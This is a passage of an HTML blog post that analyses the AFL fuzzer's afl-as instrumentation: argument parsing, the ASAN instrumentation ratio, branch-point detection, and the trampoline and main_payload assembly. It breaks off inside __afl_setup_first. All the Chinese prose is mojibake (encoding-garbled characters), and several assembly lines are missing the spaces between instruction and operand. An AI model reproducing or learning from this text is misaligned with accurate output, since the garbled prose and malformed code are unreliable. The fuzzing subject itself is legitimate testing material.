æ­¤éœ€è¦å¯¹<code>afl-as</code>è¿›è¡Œdebugã€‚</p></li></ul></li><li><p><strong>æºç è§£æ</strong>ï¼š</p><p>ä¸€äº›å±€éƒ¨å˜é‡ï¼šinst_ratio_str =&gt; <strong>inst_ratio</strong> [é»˜è®¤ä¸º100ï¼Œæ’æ¡©ç‡ 0~100]ï¼›<strong>sanitizer</strong> [æ˜¯å¦å¯ç”¨ASAN/MSAN?] </p><ul><li><p><code>srandom()</code>ï¼šç½®æ—¶é—´ç§å­ï¼Œç§å­ç”±å½“å‰æ—¶é—´çš„ç§’ã€å¾®ç§’å’Œè¿›ç¨‹pidå¼‚æˆ–å¾—åˆ°</p></li><li><p><code>edit_params()</code>ï¼šæ„é€ æ±‡ç¼–æ‰€ä½¿ç”¨çš„å‘½ä»¤è¡Œ</p><ul><li><p>ç¯å¢ƒå˜é‡<code>TMPDIR</code>å¯ä»¥è‡ªå®šä¹‰ä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œæ­¤å¤–ï¼Œç¯å¢ƒå˜é‡<code>TEMP</code>å’Œ<code>TMP</code>åŒæ ·æœ‰ç›¸åŒçš„åŠŸèƒ½ï¼Œå¦åˆ™<code>tmp_dir</code>é»˜è®¤ä¸ºâ€<code>/tmp</code>â€œï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¹‹å‰å°†æ±‡ç¼–æ–‡ä»¶æ”¾ç½®åœ¨<code>tmp</code>ç›®å½•ä¸‹çš„åŸå›  <span class="github-emoji"><span>âœ‹</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p></li><li><p>ç„¶åå°†åŸ<code>argv</code>ã€å‰ <code>argc-1</code> ä¸ªé€‰é¡¹ã€‘æ‹·è´åˆ°<code>as_params[]</code>ä¸­ã€‚è¿™é‡Œæ£€æµ‹åŸå‘½ä»¤è¡Œä¸­æ˜¯å¦å‡ºç°<code>"--64"</code> / <code>"--32"</code>  =&gt; å°†<code>use_64bit</code>æ ‡å¿—å˜é‡ç›¸åº”çš„è®¾ç½®ä¸º1 / 0</p><p><span class="github-emoji"><span>âš </span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ³¨ï¼šåœ¨è°ƒç”¨<code>afl-as</code>æ—¶ï¼Œå¿…é¡»å°†è¾“å…¥æ–‡ä»¶æ”¾ç½®åœ¨æœ€åï¼Œå³<code>afl-as -o xxx.o xxx.s</code><span class="github-emoji"><span>âœ”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ï¼Œ<code>afl-as xxx.s -o xxx.o</code><span class="github-emoji"><span>âŒ</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> </p><p><code>input_file = argv[argc - 1] // xxx.s</code></p></li><li><p>åˆ¤æ–­<code>input_file</code>æ˜¯å¦åœ¨<code>/tmp</code>æˆ–<code>/var/tmp</code>ï¼Œå¦‚æœä¸å†åˆ™å°†<code>pass_thru</code>ç½®ä¸º1ã€è¿™ä¼šå¯¼è‡´åé¢ä¸è¿›è¡Œæ’æ¡©æ“ä½œã€‘</p><p><code>modified_file</code>ä¸ºæ’æ¡©åæ±‡ç¼–æ–‡ä»¶ï¼Œè¿™é‡Œæ ¹æ®æ—¶é—´å’Œpidéšæœºåˆ†é…ä¸€ä¸ªåå­—ï¼Œå¦‚<code>/tmp/.afl-4270-1669033267.s</code></p><p>ç„¶åå°†<code>modified_file</code>æ·»åŠ åˆ°<code>as_params</code>æœ€åï¼Œä½œä¸ºæ±‡ç¼–å™¨çš„è¾“å…¥æ–‡ä»¶ï¼</p></li></ul></li><li><p>å¦‚æœè®¾ç½®äº†ç¯å¢ƒå˜é‡<code>AFL_USE_ASAN</code>æˆ–<code>AFL_USE_MSAN</code>ï¼Œå°†sanitizerç½®ä¸º1ï¼Œä¸”å°†<strong>æ’æ¡©ç‡inst_ratioé™¤ä»¥3</strong></p><p><span class="github-emoji"><span>â“</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¿™é‡Œä¸ºå•¥è¦å°†<code>inst_ratio</code>é™¤ä»¥3ï¼Ÿ</p><blockquote><p>æºç æ³¨é‡Šä¸­ä½œè€…è¿™æ ·æè¿°ï¼š</p><p>â€œåœ¨ä½¿ç”¨ASANç¼–è¯‘æ—¶ï¼Œæ²¡æœ‰ä¸€ä¸ªç‰¹åˆ«ä¼˜é›…çš„æ–¹æ³•è·³è¿‡ASANç‰¹æœ‰çš„åˆ†æ”¯ï¼Œä½†å¯ä»¥é€šè¿‡æ’æ¡©ç‡ä¸Šè¿›è¡Œè¡¥å¿â€¦â€</p><p>è§è§£ï¼š<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ASANä¼šå¼•å…¥ç”±ASANæ‰€å¯¼è‡´çš„ç‰¹å®šåˆ†æ”¯ï¼Œè€Œå¦‚å‰æ‰€è¿°ï¼ŒASANæ’æ¡©æ˜¯åœ¨ç¼–è¯‘è¿‡ç¨‹å®Œæˆçš„ï¼Œè€ŒAFLåœ¨ç¼–è¯‘å™¨ç”Ÿæˆçš„æ±‡ç¼–åŸºç¡€ä¸Šè¿›è¡Œæ’æ¡©ï¼Œå› æ­¤ä¼šå¯¹ASANæœ¬èº«ç‰¹å®šçš„åˆ†æ”¯è¿›è¡Œæ’æ¡©ã€‚æ¦‚ç‡æ’æ¡©ï¼ˆ33%ï¼‰åœ¨ä¸€å®šç¨‹åº¦ä¸Šèƒ½å¤Ÿåæ˜ è½¯ä»¶çš„çœŸå®è¦†ç›–ç‡å¤§å°ã€‚</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ASANçš„æ’æ¡©æ˜¯<strong>é‡é‡çº§</strong>çš„ï¼Œå› æ­¤ASANå¼•å…¥çš„è¾¹å¯èƒ½ä¼šå¯¼è‡´æ¯”ç‰¹ä½å›¾ç¢°æ’æ€§æå‡ï¼Œè€Œæ¦‚ç‡æ’æ¡©èƒ½å¤Ÿè§£å†³è¿™ä¸€é—®é¢˜</p></blockquote></li><li><p><code>add_instrumentation()</code>ï¼šå¯¹æ±‡ç¼–æ–‡ä»¶è¿›è¡Œ<strong>æ’æ¡©</strong>ï¼ˆåˆ†æ”¯å¤„æ’æ¡© + ç›¸å…³è°ƒç”¨å‡½æ•°ï¼‰</p><ul><li><p>å¦‚æœ<code>input_file</code>æ–‡ä»¶ä¸èƒ½æ‰“å¼€ï¼Œåˆ™å°†<code>stdin</code>ä½œä¸ºè¾“å…¥ï¼›<code>modified_file</code>ä½œä¸ºè¾“å‡ºæ–‡ä»¶ï¼›</p></li><li><p>ã€<strong>åˆ†æ”¯å¤„æ’æ¡©</strong>ã€‘è¯»å–<code>input_file</code>ä¸­çš„æ¯ä¸€è¡Œï¼Œå¹¶åšä¸€ç³»åˆ—çš„åˆ¤æ–­ï¼Œå…¶ä¸»è¦æ‰¾åˆ°ä¸‰ä¸ªä½ç½®ï¼š</p><ul><li><strong>å‡½æ•°å¤´ï¼š</strong></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">function_name:<br>.LFB23:<br>.file 1 "afl_inst_test.c"<br>.loc 1 3 0<br>.cfi_startproc<br>.LVL0:<br>.loc 1 5 0<br># &lt;&lt;======== instrumentation here<br>movl%edi, %eax<br></code></pre></td></tr></tbody></table></figure><ul><li><strong>jx/jxxçš„ä¸¤æ¡åˆ†æ”¯ï¼š</strong></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># branch 1<br>.LVL7:<br>.loc 1 14 0<br>movl4(%rsp), %edx<br>cmpl$0, %edx<br>jg.L11<br># &lt;&lt;======== instrumentation here<br>.loc 1 16 0<br>jne.L12<br># &lt;&lt;======== instrumentation here<br>...<br># branch 2<br>.L11:<br>.cfi_restore_state<br>.LVL10:<br>.LBB26:<br>.LBB27:<br>.loc 2 104 0<br># &lt;&lt;======== instrumentation here<br>leaq.LC2(%rip), %rsi<br>movl$1, %edi<br>xorl%eax, %eax<br>call__printf_chk@PLT<br>.LVL11:<br>jmp.L7<br>.LVL12:<br>.L12:<br>.LBE27:<br>.LBE26:<br>.LBB28:<br>.LBB29:<br># &lt;&lt;======== instrumentation here<br>leaq.LC3(%rip), %rsi<br>movl$1, %edi<br>xorl%eax, %eax<br>call__printf_chk@PLT<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æ±‡ç¼–ä¸­<code>.</code>å¼€å¤´æ ‡è¯†çš„æ„ä¹‰ [16]ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>.loc</code>ï¼š**Line Of Code [-g?]**ï¼Œæ ¼å¼ä¸º <code>.loc æ–‡ä»¶åºå· è¡Œåºå· [åˆ—] [é€‰é¡¹]</code>ï¼Œåœ¨ä¸Šç¤ºä¾‹ä¸­ï¼Œ<code>.loc 1 14 0</code>è¡¨ç¤ºfile 1ï¼šafl_inst_test.cï¼Œç¬¬14è¡Œç¬¬0åˆ— [17]</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> GCCä½¿ç”¨<code>.L</code>ç”¨äº<strong>æœ¬åœ°æ ‡ç­¾</strong></p><blockquote><p>æœ¬åœ°ç¬¦å·æ˜¯ä»¥æŸç§æœ¬åœ°æ ‡ç­¾å‰ç¼€å¼€å¤´çš„ä»»ä½•ç¬¦å·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒELFç³»åˆ—çš„æœ¬åœ°æ ‡ç­¾å‰ç¼€æ˜¯â€œ.Lâ€</p><p>æœ¬åœ°ç¬¦å·åœ¨æ±‡ç¼–å™¨ä¸­è¢«å®šä¹‰å’Œä½¿ç”¨ï¼Œä½†å®ƒä»¬é€šå¸¸ä¸è¢«ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ã€‚å› æ­¤åœ¨è°ƒè¯•æ—¶å®ƒä»¬æ˜¯ä¸å¯è§çš„ã€‚å¯ä»¥ä½¿ç”¨<code>-L</code>é€‰é¡¹ä¿ç•™ç›®æ ‡æ–‡ä»¶ä¸­çš„æœ¬åœ°ç¬¦å· [18]</p><p>e.g.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;/tmp$ as -c -L afl_inst_test.s <span class="hljs-comment"># you can also use `as --keep-locals -c afl_inst_test.s`</span><br>&gt;/tmp$ nm a.out<br>&gt;0000000000000000 T fun<br>      U _GLOBAL_OFFSET_TABLE_<br>      U __isoc99_scanf<br>&gt;000000000000006d t .L11<br>&gt;0000000000000082 t .L12<br>&gt;0000000000000097 t .L13<br>&gt;...<br>&gt;/tmp$ as -c afl_inst_test.s <br>&gt;/tmp$ nm a.out<br>&gt;0000000000000000 T fun<br>      U _GLOBAL_OFFSET_TABLE_<br>      U __isoc99_scanf<br>&gt;0000000000000000 r .LC0<br>&gt;0000000000000000 r .LC1<br>&gt;0000000000000003 r .LC2<br>&gt;000000000000001c r .LC3<br>&gt;0000000000000035 r .LC4<br>&gt;0000000000000000 T main<br>      U __printf_chk<br>      U __stack_chk_fail<br>&gt;/tmp$ <br></code></pre></td></tr></tbody></table></figure></blockquote><p><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>.L</code><strong>å‰ç¼€</strong>ï¼ˆæ˜¯DWARFè°ƒè¯•ä¿¡æ¯ï¼Œä¸é‡è¦ï¼‰ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUNC_BEGIN_LABEL  <span class="hljs-string">"LFB"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUNC_END_LABEL    <span class="hljs-string">"LFE"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLOCK_BEGIN_LABEL <span class="hljs-string">"LBB"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLOCK_END_LABEL   <span class="hljs-string">"LBE"</span></span><br>ASM_GENERATE_INTERNAL_LABEL (loclabel, <span class="hljs-string">"LVL"</span>, loclabel_num);<br></code></pre></td></tr></tbody></table></figure><p>LFBï¼šå‡½æ•°å¼€å§‹ï¼› LFEï¼šå‡½æ•°ç»“æŸï¼›LBBï¼šå—å¼€å§‹ï¼›LBEï¼šå—ç»“æŸï¼›LVLï¼šå°šä¸çŸ¥</p><p>è¯¦è§ [19]</p></li><li><p>ã€ç›¸å…³è°ƒç”¨å‡½æ•°çš„é™„åŠ ã€‘æœ€åï¼Œå°†<code>main_payload_64</code>æˆ–<code>main_payload_32</code>æ·»åŠ åˆ°æ±‡ç¼–æ–‡ä»¶çš„æœ«å°¾å¤„ã€‚è‡³æ­¤ï¼Œæ‰€æœ‰çš„æ’æ¡©è¿‡ç¨‹å‡å·²å®Œæˆï¼</p></li></ul></li><li><p><code>execvp()</code>ï¼š<code>fork</code>ä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œæ„é€ çš„æ–°çš„<code>as_params</code>ï¼Œå³å¯¹æ’æ¡©åçš„æ±‡ç¼–æ–‡ä»¶è¿›è¡Œæ±‡ç¼–æ“ä½œã€‚æœ€ååˆ é™¤ä¸´æ—¶æ–‡ä»¶ [<code>modified_file</code>]ï¼Œè‡³æ­¤ï¼Œæ±‡ç¼–ä»»åŠ¡å®Œæˆ</p></li></ul></li></ul><h4 id="3-afl-as-h-æ¡©ä»£ç è§£æ"><a href="#3-afl-as-h-æ¡©ä»£ç è§£æ" class="headerlink" title="3. afl-as.h (æ¡©ä»£ç è§£æ)"></a>3. afl-as.h (æ¡©ä»£ç è§£æ)</h4><ul><li>ä¸»è¦æœ‰ä¸¤ä¸ªæ¡©ä»£ç ï¼š<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>trampoline_fmt_64/trampoline_fmt_32</code>ï¼›<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>main_payload_64/main_payload_32</code>ï¼›</li></ul><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>trampoline_fmt_64/trampoline_fmt_32</code>ï¼ˆä»¥64ä½ä¸ºä¾‹ï¼‰ï¼š</p><ul><li>æ±‡ç¼–ç ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* --- AFL TRAMPOLINE (64-BIT) --- */<br><br>.align 4<br><br>leaq -(128+24)(%rsp), %rsp # åˆ†é…152å­—èŠ‚çš„æ ˆç©ºé—´<br>movq %rdx,  0(%rsp) # ä¿å­˜ç°åœº<br>movq %rcx,  8(%rsp)<br>movq %rax, 16(%rsp)<br>movq $0x%08x, %rcx    /* %08xæ˜¯ä¸€ä¸ªæ¯”ç‰¹ä½å›¾å¤§å°å†…çš„éšæœºæ•° */<br>call __afl_maybe_log<br>movq 16(%rsp), %rax # æ¢å¤ç°åœº<br>movq  8(%rsp), %rcx<br>movq  0(%rsp), %rdx<br>leaq (128+24)(%rsp), %rsp # å¤åŸæ ˆ<br><br>/* --- END --- */<br></code></pre></td></tr></tbody></table></figure><ul><li>ä¸Šè¿°æ±‡ç¼–ç è°ƒç”¨äº†<code>__afl_maybe_log(%rcx[i.e.å½“å‰åˆ†æ”¯å¯¹åº”çš„éšæœºæ•°])</code>æ¥è®°å½•è¾¹çš„æƒ…å†µ</li></ul><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>main_payload_64/main_payload_32</code>ï¼ˆä»¥64ä½ä¸ºä¾‹ï¼‰ï¼š</p><ul><li>æ±‡ç¼–ç ä¸»è¦åŒ…æ‹¬10ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼š<code>__afl_maybe_log</code>ã€<code>__afl_store</code>ã€<code>__afl_return</code>ã€<code>__afl_setup</code>ã€<code>__afl_setup_first</code>ã€<code>__afl_forkserver</code>ã€<code>__afl_fork_wait_loop</code>ã€<code>__afl_fork_resume</code>ã€<code>__afl_die</code>ã€<code>__afl_setup_abort</code></li><li><code>__afl_maybe_log</code>ã€<code>__afl_store</code>ã€<code>__afl_return</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_maybe_log:<br><br>  lahf   # save other flags to AH<br>  seto  %al   # set OF to al<br><br>  /* Check if SHM region is already mapped. */<br><br>  movq  __afl_area_ptr(%rip), %rdx # __afl_area_ptræ˜¯å…±äº«çš„bitmapä½å›¾å†…å­˜å—<br>  testq %rdx, %rdx<br>  je    __afl_setup   # je =&gt; jz å³åˆ¤æ–­è¯¥åœ°å€æ˜¯å¦ä¸º0ï¼›å¦‚æœä¸º0ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–<br>  <br>__afl_store:<br><br>  /* Calculate and store hit for the code location specified in rcx. */<br><br>  xorq __afl_prev_loc(%rip), %rcx  # %rcx = pre ^ cur<br>  xorq %rcx, __afl_prev_loc(%rip)  # __afl_prev_loc = pre ^ cur ^ pre = cur<br>  shrq $1, __afl_prev_loc(%rip)    # __afl_prev_loc = cur &gt;&gt; 1<br>  # (pre &gt;&gt; 1) ^ cur<br>  incb (%rdx, %rcx, 1)             # __afl_area_ptr[%rcx] = __afl_area_ptr[%rcx] + 1<br><br>__afl_return:<br><br>  addb $127, %al   # restore OF (if OF=1, al+127=128 =&gt; OF=1 else OF=0)<br>  sahf   # restore other flags<br>  ret<br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.align 8<br><br>__afl_setup:<br><br>  /* Do not retry setup if we had previous failures. */<br><br>  cmpb $0, __afl_setup_failure(%rip)  # å˜é‡__afl_setup_failureå¦‚æœä¸º0ï¼Œè¡¨ç¤ºä¹‹å‰é…ç½®æ²¡é—®é¢˜ï¼Œå¦åˆ™è¡¨ç¤ºä¹‹å‰å‡ºé”™äº†ï¼Œé‚£ä¹ˆè¿”å›<br>  jne __afl_return<br><br>  /* Check out if we have a global pointer on file. */<br><br>  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx  # å°†__afl_global_area_ptrç§»é€åˆ°%rdx<br>  movq  (%rdx), %rdx    # å°†%rdxæŒ‡å‘çš„å€¼èµ‹å€¼ç»™%rdx<br>  testq %rdx, %rdx# åˆ¤æ–­%rdxæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸º0ï¼Œè¡¨æ˜æœªè¿›è¡Œåˆå§‹åŒ–æ“ä½œ<br>  je    __afl_setup_first# è·³è½¬åˆ°__afl_setup_firstè¿›è¡Œåˆå§‹åŒ–æ“ä½œ<br><br>  movq %rdx, __afl_area_ptr(%rip)# å°†å…¨å±€æŒ‡é’ˆèµ‹å€¼ç»™__afl_area_ptr<br>  jmp  __afl_store# æ›´æ–°å…¨å±€è¾¹è®¡æ•°<br><br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup_first</code>ã€<code>__afl_forkserver</code>ã€<code>__afl_fork_resume</code>å’Œ<code>__afl_die</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_setup_first:<br><br>  /* Save everything that is not yet saved and that may be touched by<br>     getenv() and several other libcalls we'll be relying on. */<br><br>  leaq -352(%rsp), %rsp<br>  <br>  # ä¿æŠ¤ç°åœº<br>  movq %rax,   0(%rsp)<br>  movq %rcx,   8(%rsp)<br>  movq %rdi,  16(%rsp)<br>  movq %rsi,  32(%rsp)<br>  movq %r8,   40(%rsp)<br>  movq %r9,   48(%rsp)<br>  movq %r10,  56(%rsp)<br>  movq %r11,  64(%rsp)<br><br>  movq %xmm0,  96(%rsp)<br>  movq %xmm1,  112(%rsp)<br>  movq %xmm2,  128(%rsp)<br>  movq %xmm3,  144(%rsp)<br>  movq %xmm4,  160(%rsp)<br>  movq %xmm5,  176(%rsp)<br>  movq %xmm6,  192(%rsp)<br>  movq %xmm7,  208(%rsp)<br>  movq %xmm8,  224(%rsp)<br>  movq %xmm9,  240(%rsp)<br>  movq %xmm10, 256(%rsp)<br>  movq %xmm11, 272(%rsp)<br>  movq %xmm12, 288(%rsp)<br>  movq %xmm13, 304(%rsp)<br>  movq %xmm14, 320(%rsp)<br>  movq %xmm15, 336(%rsp)<br><br>  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */<br><br>  /* The 64-bit ABI requires 16-byte stack alignment. We'll keep the<br>     original stack ptr in the callee-saved r12. */<br><br>  pushq %r12<br>  movq  %rsp, %r12# å°†%rspæš‚å­˜åˆ°%r12ä¸­<br>  subq  $16, %rsp# ä¸º%rspåˆ†é…16å­—èŠ‚çš„ç©ºé—´<br>  andq  $0xfffffffffffffff0, %rsp   # 